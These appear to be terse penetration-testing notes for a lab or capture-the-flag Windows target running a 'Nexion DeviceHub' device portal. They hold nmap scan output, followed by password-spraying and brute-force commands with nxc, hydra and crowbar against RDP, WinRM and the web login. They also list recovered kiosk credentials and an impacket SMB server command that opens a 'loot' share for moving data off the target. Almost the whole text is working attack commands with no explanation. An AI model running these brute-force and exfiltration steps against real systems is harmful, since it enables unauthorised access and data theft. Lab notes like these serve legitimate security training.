```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
3389/tcp open  ms-wbt-server Microsoft Terminal Service
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8443/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-cors: GET POST PUT OPTIONS
| http-title: Nexion DeviceHub - Login
|_Requested resource was /login
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
Jenny Crawford / KS7X2M
./username-anarchy -i ./user.txt > username.txt
# 3389
nxc rdp $target -u username.txt -p 'KS7X2M' --continue-on-success
hydra -L username.txt -p 'KS7X2M' $target rdp
crowbar -b rdp -s $target/32 -U username.txt -c 'KS7X2M'
# 5985
nxc winrm $target -u username.txt -p 'KS7X2M' --continue-on-success
# 8443
hydra -l admin -P $rockyou 10.129.8.151 http-post-form "/login:password=^PASS^:F=Invalid password" -s 8443
```

```
http://10.129.8.151:8443/api/status
|device|"Nexion DeviceHub DH-100"|
|serial|"NX-DH-2024-B7042"|
|firmware|"1.4.2"|
|status|"online"|
|uptime|19536|
```

```
|Serial|NX-SR-2024-0042|
|Username|KioskUser|
|Password|K!0sk2026#|

	|Serial|NX-TP-2024-0042|
|Username|KioskUser 
|Password|K!0sk2026# 
```

```
sudo impacket-smbserver -smb2support -username touch -password 'TouchShare!42' loot \ /home/marcos/Desktop/loot
```









